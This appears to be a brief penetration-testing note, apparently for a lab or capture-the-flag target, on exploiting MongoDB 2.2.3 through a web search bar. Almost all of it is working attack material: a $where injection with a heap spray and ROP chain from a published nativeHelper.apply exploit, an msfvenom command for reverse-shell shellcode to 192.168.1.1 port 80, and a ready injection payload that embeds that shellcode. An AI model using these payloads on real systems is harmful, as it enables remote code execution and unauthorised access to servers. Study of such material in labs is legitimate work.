# mongodb 2.2.3

There is a search bar.

' - Gives error.&#x20;

It contains lots of good info.

* PyMongo&#x20;
* MongoClient
* Mongo 2.2.3
* NoSQL objects

https://vulners.com/exploitdb/EDB-ID:24947 - MongoDB 2.2.3 - nativeHelper.apply Remote Code Execution

```
db.my_collection.find({'$where':'shellcode=unescape("METASPLOIT JS GENERATED SHELLCODE"); sizechunk=0x1000; chunk=""; for(i=0;i<sizechunk;i++){ chunk+=unescape("%u9090%u9090"); } chunk=chunk.substring(0,(sizechunk-shellcode.length)); testarray=new Array(); for(i=0;i<25000;i++){ testarray[i]=chunk+shellcode; } ropchain=unescape("%uf768%u0816%u0c0c%u0c0c%u0000%u0c0c%u1000%u0000%u0007%u0000%u0031%u0000%uffff%uffff%u0000%u0000"); sizechunk2=0x1000; chunk2=""; for(i=0;i<sizechunk2;i++){ chunk2+=unescape("%u5a70%u0805"); } chunk2=chunk2.substring(0,(sizechunk2-ropchain.length)); testarray2=new Array(); for(i=0;i<25000;i++){ testarray2[i]=chunk2+ropchain; } nativeHelper.apply({"x" : 0x836e204}, ["A"+"\x26\x18\x35\x08"+"MongoSploit!"+"\x58\x71\x45\x08"+"sthack is a nice place to be"+"\x6c\x5a\x05\x08"+"\x20\x20\x20\x20"+"\x58\x71\x45\x08"]);'})
```

```
msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.1.1 LPORT=80 -f js_le -e generic/none

%udb31%ue3f7%u4353%u6a53%u8902%ub0e1%ucd66%u9380%ub059%ucd3f%u4980%uf979%uc068%u01a8%u6801%u0002%u5000%ue189%u66b0%u5150%ub353%u8903%ucde1%u5280%u6e68%u732f%u6868%u2f2f%u6962%ue389%u5352%ue189%u0bb0%u80cd
```

We can get reverse shell with this paylaod.

```
';shellcode=unescape("%udb31%ue3f7%u4353%u6a53%u8902%ub0e1%ucd66%u9380%ub059%ucd3f%u4980%uf979%uc068%u01a8%u6801%u0002%u5000%ue189%u66b0%u5150%ub353%u8903%ucde1%u5280%u6e68%u732f%u6868%u2f2f%u6962%ue389%u5352%ue189%u0bb0%u80cd"); sizechunk=0x1000; chunk=""; for(i=0;i<sizechunk;i++){ chunk+=unescape("%u9090%u9090"); } chunk=chunk.substring(0,(sizechunk-shellcode.length)); testarray=new Array(); for(i=0;i<25000;i++){ testarray[i]=chunk+shellcode; } ropchain=unescape("%uf768%u0816%u0c0c%u0c0c%u0000%u0c0c%u1000%u0000%u0007%u0000%u0031%u0000%uffff%uffff%u0000%u0000"); sizechunk2=0x1000; chunk2=""; for(i=0;i<sizechunk2;i++){ chunk2+=unescape("%u5a70%u0805"); } chunk2=chunk2.substring(0,(sizechunk2-ropchain.length)); testarray2=new Array(); for(i=0;i<25000;i++){ testarray2[i]=chunk2+ropchain; } nativeHelper.apply({"x" : 0x836e204}, ["A"+"\x26\x18\x35\x08"+"MongoSploit!"+"\x58\x71\x45\x08"+"sthack is a nice place to be"+"\x6c\x5a\x05\x08"+"\x20\x20\x20\x20"+"\x58\x71\x45\x08"]);'});sleep(500);
```

